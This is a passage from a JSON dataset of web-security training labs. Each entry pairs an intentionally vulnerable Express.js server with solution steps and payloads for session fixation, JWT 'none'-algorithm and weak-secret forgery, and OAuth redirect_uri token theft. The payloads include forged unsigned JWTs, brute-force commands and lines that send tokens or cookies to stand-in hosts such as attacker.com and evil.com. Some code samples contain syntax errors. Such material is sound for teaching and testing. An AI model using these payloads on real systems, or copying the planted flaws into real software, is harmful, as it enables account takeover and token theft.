    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': { password: 'hunter2' } }; app.get('/login', (req, res) => { const session = req.cookies.session || 'sess_' + Math.random().toString(36).substring(2); res.setHeader('Set-Cookie', `session=${session}; HttpOnly`); res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\" /><br/>Password: <input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { res.send(`Welcome ${username}`); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sess = req.cookies.session; if (sess && sess.startsWith('sess_')) { res.send('Account page for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "sess_presetcookievalue12345",
      "<img src='http://attacker.com?cookie=sess_presetcookievalue12345'>",
      "document.cookie='session=sess_presetcookievalue12345';"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm",
    "Lab Description": "The application improperly accepts unsigned JWTs by trusting the 'none' algorithm when parsing tokens. This leads to privilege escalation. To solve: forge a JWT as 'admin' and access the admin panel without a valid signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite from a POST /login request",
      "Decode the JWT and inspect its header and payload at jwt.io",
      "Replace alg to 'none' and set payload to {\"username\":\"admin\"}",
      "Strip the signature completely and send the tampered token in Authorization: Bearer header",
      "Access /admin/dashboard to confirm unauthorized access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { admin: { password: 'adminpass' }, user: { password: 'userpass' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin/dashboard', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const payload = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (payload.username === 'admin') res.send('Welcome to admin panel'); else res.status(403).send('Access denied'); } catch (e) { res.status(400).send('JWT Error'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The OAuth implementation lacks proper redirect URI validation. Attackers can inject malicious redirect URIs to steal tokens. The application accepts arbitrary URLs in the `redirect_uri` parameter during login. To solve: trick the server into redirecting the victim's token to your domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp Suite and capture the initial OAuth request containing the redirect_uri parameter",
      "Replace the redirect_uri with your attacker-controlled domain (e.g. https://evil.com/token-stealer)",
      "Send the crafted URL to the victim via social engineering",
      "Wait for the victim to authorize and capture the access_token sent to your domain",
      "Replay the token using Postman in Authorization header to access protected resource"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id !== 'trusted-app') return res.status(400).send('Invalid client'); const url = `${redirect_uri}?access_token=${tokens['carlos']}`; res.redirect(url); }); app.get('/profile', (req, res) => { const token = req.query.access_token; if (token === 'abc123token') res.send('Carlos profile'); else res.status(403).send('Invalid token'); }); app.listen(5000, () => console.log('OAuth Redirect URI Lab running on port 5000'));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=trusted-app&redirect_uri=https://evil.com/token-stealer&response_type=token",
      "https://evil.com/token-stealer?access_token=abc123token",
      "Authorization: Bearer abc123token"
    ]
  },
  {
    "Lab scenario": "JWT secret key brute-force in REST API login",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. The secret key used to sign the JWTs is weak and guessable. Tokens are validated purely on signature without proper expiration or audience claims. To solve: forge a valid JWT for the user 'carlos' using a brute-forced secret and access his account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a login request using Burp Suite and extract the JWT from the response.",
      "Use jwt_tool.py or Postman to decode and analyze the JWT header and payload.",
      "Run a brute-force attack with jwt-cracker or hashcat using a wordlist to identify the correct secret key.",
      "Recreate a token with the username changed to 'carlos', and sign it using the cracked secret.",
      "Send a GET /api/account request with the forged JWT in the Authorization header to verify successful exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'admin': 'admin123', 'carlos': 'carlos789' }; const SECRET_KEY = 'admin'; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, SECRET_KEY); return res.json({ token }); } res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/api/account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET_KEY); if (decoded.username === 'carlos') return res.send('Account details for carlos'); return res.status(403).send('Unauthorized'); } catch (err) { return res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Brute-force Lab running on port 3000'));",
    "payloads": [
      "jwt_tool.py -t <token> -d -C -S -p -k /usr/share/wordlists/rockyou.txt",
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.<valid_signature>",
      "jwt.io > manually modified payload with username 'carlos', signed with secret 'admin'"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure redirect",
    "Lab Description": "The login system fails to regenerate session tokens after authentication. Attackers can predetermine session IDs and force the victim to authenticate using them. The application accepts session IDs from the URL and uses them directly. To solve: fixate a known session ID and get Carlos to log in, then reuse that session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to register a user and analyze session handling behavior via Set-Cookie headers.",
      "Create a crafted link with a predetermined session ID using GET /login?session=attackerSession123 and send to Carlos (assumed simulated action).",
      "Wait for Carlos to log in using that link, which binds his session to attackerSession123.",
      "Send a request to /dashboard with the cookie session=attackerSession123 to access Carlos's session.",
      "Validate session takeover by confirming personalized content or account information."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; const users = { 'carlos': 'secure456' }; app.get('/login', (req, res) => { const sessId = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sessId); res.send('Login page'); }); app.post('/auth', (req, res) => { const { username, password } = req.body; const sessId = req.cookies.session; if (users[username] === password) { sessions[sessId] = username; return res.redirect('/dashboard'); } res.status(401).send('Invalid credentials'); }); app.get('/dashboard', (req, res) => { const sessId = req.cookies.session; if (sessions[sessId] === 'carlos') return res.send('Carlos's Dashboard'); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "GET /login?session=attackerSession123",
      "Cookie: session=attackerSession123",
      "POST /auth { username: 'carlos', password: 'secure456' }",
      "GET /dashboard with Cookie: session=attackerSession123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leak via referer header",
    "Lab Description": "The application uses OAuth 2.0 implicit flow and redirects tokens via the URL fragment. This fragment gets exposed through the HTTP Referer header when navigating to third-party resources. To solve: intercept the access token issued to Carlos and reuse it to access his account profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept an OAuth redirect request using Burp Suite, where the access_token is present in the URL fragment.",
      "Identify an embedded resource (e.g., image or iframe) in the post-login redirect that leaks the full URL including the token in the Referer header.",
      "Use a malicious external endpoint or inspect simulated logs to recover the leaked token.",
      "Send a GET /user/profile request with Authorization: Bearer <leaked_token> to gain access to Carlos's profile.",
      "Confirm access to protected resources without needing to reauthenticate."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'carlos': 'token-carlos-abc' }; app.get('/oauth/callback', (req, res) => { res.send(`<html><body><img src='http://attacker.com/steal?ref=${req.headers.referer}' /><script>location.href='/profile#access_token=token-carlos-abc';</script></body></html>`); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-abc') return res.send('Carlos profile info'); res.status(403).send('Access Denied'); }); app.listen(5000, () => console.log('OAuth Token Leak Lab running on port 5000'));",
    "payloads": [
      "GET /oauth/callback → Referer logs leak access_token=token-carlos-abc",
      "Authorization: Bearer token-carlos-abc",
      "GET /profile with header: Authorization: Bearer token-carlos-abc"
    ]
  },
  {
    "Lab scenario": "JWT secret key brute-force in REST API Authorization Header",
    "Lab Description": "This lab involves a JWT-based authorization system where the backend uses a weak secret key to sign tokens. The application validates JWT tokens included in the `Authorization: Bearer` header for API access. However, it fails to implement strong key management. To solve: Forge a valid admin JWT using brute-force and access the protected admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a valid request to /api/profile and copy the Authorization JWT token.",
      "2.Send the JWT to jwt.io to analyze its algorithm (HS256) and claims structure.",
      "3.Use `jwt-cracker` or `john` with rockyou.txt to brute-force the weak HMAC secret.",
      "4.Craft a new JWT token with header `{ alg: 'HS256' }` and payload `{ \"username\": \"admin\", \"role\": \"admin\" }` signed with the cracked secret.",
      "5.Use Postman to send a GET request to /api/admin-dashboard with the forged JWT in the Authorization header and verify successful access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'letmein'; app.get('/api/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const user = jwt.verify(token, SECRET); res.json({ message: `Hello ${user.username}` }); } catch { res.status(403).send('Invalid token'); } }); app.get('/api/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const user = jwt.verify(token, SECRET); if (user.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to admin dashboard'); } catch { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Authorization: Bearer <JWT with payload { \"username\": \"admin\", \"role\": \"admin\" } signed with 'letmein'>",
      "JWT brute-forced secret: letmein"
    ]
  },
  {
    "Lab scenario": "Session fixation in login endpoint with reusable session ID",
    "Lab Description": "The application sets a session ID cookie before authentication and does not regenerate it post-login. This allows attackers to fixate a victim's session by pre-defining the session cookie and tricking them into logging in using it. To solve: Log into Carlos's account by fixing a session ID and reusing it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to send a GET request to /login and note the Set-Cookie: sessionId=xyz header.",
      "2.Copy this session ID and send a crafted phishing link to Carlos with the pre-set session ID cookie.",
      "3.After Carlos logs in using the attacker-defined session, reuse the same session ID in a GET /my-account request.",
      "4.In Burp, add Cookie: sessionId=xyz and send the request to /my-account to access Carlos’s session.",
      "5.Verify lab success by reading Carlos's personal data from the account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(7); res.cookie('sessionId', sid); res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies.sessionId; sessions[sid] = user.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionId; if (sessions[sid]) return res.send(`Welcome ${sessions[sid]}`); res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "GET /login → extract sessionId from Set-Cookie",
      "Send phishing link with fixed sessionId cookie to victim",
      "Reuse sessionId in Cookie header after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation leading to account takeover",
    "Lab Description": "The application uses OAuth for third-party login but improperly validates redirect URIs during the authentication handshake. An attacker can tamper with the redirect_uri parameter to receive the authorization code for another user. To solve: Steal Carlos’s OAuth code and use it to link his account to yours.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to intercept the initial /auth/google request and observe the redirect_uri parameter.",
      "2.Change the redirect_uri to a domain controlled by the attacker (e.g. attacker.com/oauth-callback) and host a listener.",
      "3.Send Carlos a phishing link with the modified redirect_uri and trick him into authenticating.",
      "4.Receive Carlos’s OAuth authorization code on your listener and exchange it for a valid access token via Google's token endpoint.",
      "5.Send a POST request to /oauth/callback with Carlos's token and gain access to his account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/auth/google', (req, res) => { const redirectUri = req.query.redirect_uri; const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id=abc123&redirect_uri=${redirectUri}&scope=profile`; res.redirect(authUrl); }); app.post('/oauth/callback', async (req, res) => { const { code } = req.body; const response = await axios.post('https://oauth2.googleapis.com/token', { code, client_id: 'abc123', client_secret: 'secret', redirect_uri: req.headers.referer, grant_type: 'authorization_code' }); const accessToken = response.data.access_token; res.send(`Access token: ${accessToken}`); }); app.listen(4000);",
    "payloads": [
      "Modified redirect_uri=https://attacker.com/oauth-callback",
      "OAuth token request using stolen code",
      "POST /oauth/callback with code=<Carlos’s code>"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Bypass in Token Verification",
    "Lab Description": "The application verifies JWT tokens without enforcing strict validation of the algorithm used. The vulnerable component fails to check if the 'alg' parameter is set to 'none'. The application accepts this altered token as valid, allowing attackers to forge tokens and impersonate users. To solve: forge a valid JWT for the user 'carlos' using algorithm 'none' and access the /my-account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp Suite to capture the JWT after logging in with your own account.",
      "Decode the JWT using jwt.io or a Python script to inspect the header and payload.",
      "Modify the header to set 'alg' to 'none' and change the payload to {\"username\":\"carlos\"}. Remove the signature.",
      "Re-encode the modified JWT and send it with a new Authorization: Bearer header in a request to /my-account.",
      "Verify access is granted to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos' }, { username: 'wiener' }]; app.use(require('body-parser').json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); return res.send(`Welcome ${payload.username}`); } jwt.verify(token, 'secret'); const verifiedPayload = jwt.decode(token); res.send(`Welcome ${verifiedPayload.username}`); } catch { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT None Bypass running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{ \"username\":\"carlos\" }."
    ]
  },
  {
    "Lab scenario": "OAuth Token Leakage in Redirect URL Handler",
    "Lab Description": "The OAuth flow in this application mishandles access tokens by reflecting them in the URL. A malicious actor can harvest tokens via browser history or referer headers. The application redirects to a vulnerable page with tokens embedded. To solve: steal the access token issued to Carlos and use it to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth authorization request.",
      "Notice the access token returned in the URL as a query string: /redirect?access_token=....",
      "Craft a malicious redirect_uri to exfiltrate this token using a web server you control (e.g., requestbin).",
      "Force the victim (Carlos) to authenticate via the crafted link and capture the token.",
      "Replay the request to /my-account using Authorization: Bearer <stolen_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const accessTokens = { 'carlos-token': 'carlos' }; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = 'carlos-token'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const user = accessTokens[token]; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Access denied'); } }); app.listen(3000, () => console.log('OAuth Token Leak running'));",
    "payloads": [
      "https://attacker.com/redirect?access_token=carlos-token",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Session Initialization",
    "Lab Description": "The application allows users to supply their own session identifiers before authentication. Session tokens are not regenerated after login, enabling fixation. The attacker can fix a session ID and trick a victim into logging in with it. To solve: fix a session ID for Carlos, wait for login, then access /dashboard using the same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate a session by visiting / and setting a custom session ID like session=attacker123.",
      "Send the session link (with the pre-set session ID) to the victim via phishing (e.g., /login with ?session=attacker123).",
      "Wait until the victim logs in using the fixed session.",
      "Use the same session ID to access the /dashboard endpoint.",
      "Validate that the response shows Carlos's data, confirming successful session fixation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 's3cret' }; app.use((req, res, next) => { let sid = req.cookies.session || req.query.session || `sess-${Math.random()}`; res.cookie('session', sid); if (!sessions[sid]) sessions[sid] = {}; req.session = sessions[sid]; next(); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/dashboard', (req, res) => { if (req.session.user) res.send(`Dashboard for ${req.session.user}`); else res.status(403).send('Not authenticated'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "/?session=attacker123",
      "POST /login with session=attacker123, username=carlos, password=s3cret",
      "GET /dashboard with cookie session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT signature none bypass in authentication header",
    "Lab Description": "The authentication system uses JWTs but fails to validate tokens with the 'none' algorithm. The application uses the JWT in the Authorization header for access control but does not enforce proper algorithm checks during signature verification. To solve: craft a forged JWT with algorithm set to 'none' and access Carlos's account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite Proxy after logging into your own account.",
      "Send the request to Burp Repeater and observe the JWT format: header.payload.signature.",
      "Modify the JWT header to {\"alg\":\"none\"} and remove the signature section entirely.",
      "In the JWT payload, change the username from your own to 'carlos'. Re-encode the token using Base64 without padding.",
      "Replace the Authorization header with the tampered token and resend the request to the protected /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth redirect_uri manipulation in login flow",
    "Lab Description": "The application uses a third-party OAuth provider for login and redirects users based on the 'redirect_uri' parameter. The redirect URI is insufficiently validated, allowing attackers to steal authorization codes. To solve: intercept and modify the OAuth flow to capture Carlos's code and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start the login process and observe the OAuth redirection request in Burp Suite with a redirect_uri parameter.",
      "Send the request to Repeater and change redirect_uri to your own attacker-controlled domain that captures query parameters.",
      "Send the modified link to Carlos through any injection point (e.g., comment box or support message) if social engineering is enabled.",
      "Wait for Carlos to click the malicious link and capture the code from your HTTP server.",
      "Exchange the stolen code manually using Postman to retrieve Carlos's access_token and use it to call the /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth-callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const response = await axios.post('https://oauth.example.com/token', { code, redirect_uri }); const token = response.data.access_token; res.cookie('session', token); res.redirect('/account'); } catch (e) { res.status(400).send('OAuth error'); } }); app.get('/account', (req, res) => { const token = req.cookies.session; if (token === 'carlos_token') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://auth.example.com/authorize?client_id=app123&redirect_uri=https://evil.com/capture",
      "code=abc123&redirect_uri=https://evil.com/capture"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow via Set-Cookie header manipulation",
    "Lab Description": "The application assigns the session ID before login and does not rotate it upon authentication. This flaw allows attackers to fixate a known session ID for the victim before login. To solve: predefine a session ID, trick Carlos into logging in, and reuse the same session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, access the site as an unauthenticated user and capture the Set-Cookie response.",
      "Override the session cookie with a custom predictable value using a browser plugin or a crafted link.",
      "Send Carlos a link to log in via a session already set by you (e.g., through CSRF or phishing).",
      "Once Carlos logs in using the fixed session, reuse that same session cookie in your browser.",
      "Access the /account page and verify Carlos’s account data is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/', (req, res) => { let sid = req.cookies.sid || 'sess_' + Math.random().toString(36).substring(2); res.cookie('sid', sid); sessions[sid] = { username: null }; res.send('Guest session initiated'); }); app.post('/login', (req, res) => { const { username, password } = req.query; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid].username = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "sid=sess_fixedtoken1234",
      "GET /login?username=carlos&password=hunter2 (with sid=sess_fixedtoken1234 in cookie)",
      "GET /account (with same sid cookie)"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in authentication flow",
    "Lab Description": "The OAuth implementation in this application contains weak validation of redirect URIs. This allows an attacker to hijack tokens by injecting malicious domains. The application blindly trusts user-controlled redirect_uri parameters during the OAuth login flow, enabling redirection to external, attacker-controlled endpoints. To solve: capture an OAuth access token issued for Carlos by manipulating the redirect flow and use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial OAuth authorization request",
      "Confirm the redirect_uri parameter is not validated properly by sending it to a malicious domain you control",
      "Craft a malicious authorization request with redirect_uri=https://evil.com/callback",
      "Set up a listener on https://evil.com to capture the OAuth access token fragment or query",
      "Use Postman to send a request with the stolen token as Authorization: Bearer {token} to /api/userinfo to confirm access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthServer = { authorize: (client_id, redirect_uri, state) => `${redirect_uri}?code=abc123&state=${state}` }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const redirectURL = oauthServer.authorize(client_id, redirect_uri, state); res.redirect(redirectURL); }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth redirect flow vulnerable lab on port ${PORT}`));",
    "payloads": [
      "https://attacker.com/callback",
      "https://evil.example.com/oauth-steal",
      "http://malicious.io/redirect#access_token=steal"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application allows attackers to set session cookies before authentication and reuses them post-login. This allows a session fixation attack where the attacker sets their own session ID, tricks the victim into using it, and later hijacks the session after the victim logs in. To solve: pre-set a session ID, force Carlos to authenticate using it, then hijack the session to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a GET /login request while setting your custom session cookie using Burp Suite",
      "Send this fixed session link to Carlos via social engineering or lure (simulate manually)",
      "Once Carlos logs in using that session, reuse the session ID to access /my-account",
      "Verify account access by visiting /my-account with the fixed session",
      "Capture the personalized response and extract sensitive user data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sessionId = req.cookies.session || Math.random().toString(36).substring(2); sessions[sessionId] = { authenticated: false }; res.cookie('session', sessionId); res.send('Login form'); }); app.post('/login', (req, res) => { const sessionId = req.cookies.session; if (sessionId && sessions[sessionId]) { sessions[sessionId].authenticated = true; res.send('Logged in'); } else { res.status(400).send('Session missing'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; if (sessions[sessionId]?.authenticated) res.send('Welcome Carlos'); else res.status(401).send('Unauthorized'); }); app.listen(4001);",
    "payloads": [
      "Cookie: session=fixedSession123",
      "http://target-app/login (with session=fixed123)",
      "Session fixation via iframe + set-cookie header"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in access token validation",
    "Lab Description": "The application uses JWTs to authorize access to user accounts but fails to enforce signature verification properly. It blindly accepts tokens where the alg field is set to 'none'. To solve: forge a JWT with alg=none and payload containing 'username':'carlos', then use it to access Carlos's account via the protected endpoint.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture a legitimate JWT using Burp Suite after logging in",
      "Decode the token using jwt.io or Burp Decoder",
      "Create a new token with alg set to none and payload { \"username\": \"carlos\" }",
      "Remove the signature part and send the token in the Authorization header",
      "Access the protected endpoint /api/account using the forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') { res.send('Access granted to Carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(4002);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [none-alg payload]",
      "JWT with header: { \"alg\": \"none\" }, payload: { \"username\": \"carlos\" }"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass in API endpoint",
    "Lab Description": "This lab's backend relies on JSON Web Tokens (JWT) to validate user sessions. However, it fails to enforce proper algorithm checks. The application incorrectly accepts tokens signed with the 'none' algorithm. To solve: Access Carlos's data through the protected /api/user endpoint by forging a valid-looking JWT.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request to /api/user while logged in as your own user. Extract the Authorization: Bearer token.",
      "Copy the JWT and decode it using jwt.io or Burp Decoder. Observe the structure and claims.",
      "Replace the 'alg' field from 'HS256' to 'none' and modify the 'sub' claim to 'carlos'.",
      "Remove the signature segment entirely, leaving only the header and payload segments separated by two dots.",
      "Send the forged token in a request to /api/user with Authorization: Bearer [modified-token]. Verify successful access to Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { carlos: { role: 'admin', data: 'Secret data' } }; app.get('/api/user', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token provided'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); const user = users[payload.sub]; if (user) return res.json(user); return res.status(403).send('Invalid user'); } try { const verified = jwt.verify(token, 'super-secret-key'); const user = users[verified.sub]; if (user) return res.json(user); return res.status(403).send('Invalid user'); } catch (e) { return res.status(403).send('Token verification failed'); } }); const PORT = 4000; app.listen(PORT, () => console.log(JWT Bypass Lab running on http://localhost:${PORT}));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab's login system is vulnerable to session fixation due to the reuse of session identifiers across authentication boundaries. Attackers can preset a session cookie and trick a victim into logging in with it. To solve: Fix a session ID, log Carlos in using it, then use the same session to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request to /login with a custom session ID cookie (e.g., session=attacker123).",
      "Send a valid login request for Carlos using his credentials while preserving the same session cookie value.",
      "Once Carlos is authenticated under that session ID, reuse the session=attacker123 cookie in a new GET request to /my-account.",
      "Confirm access to Carlos's authenticated session.",
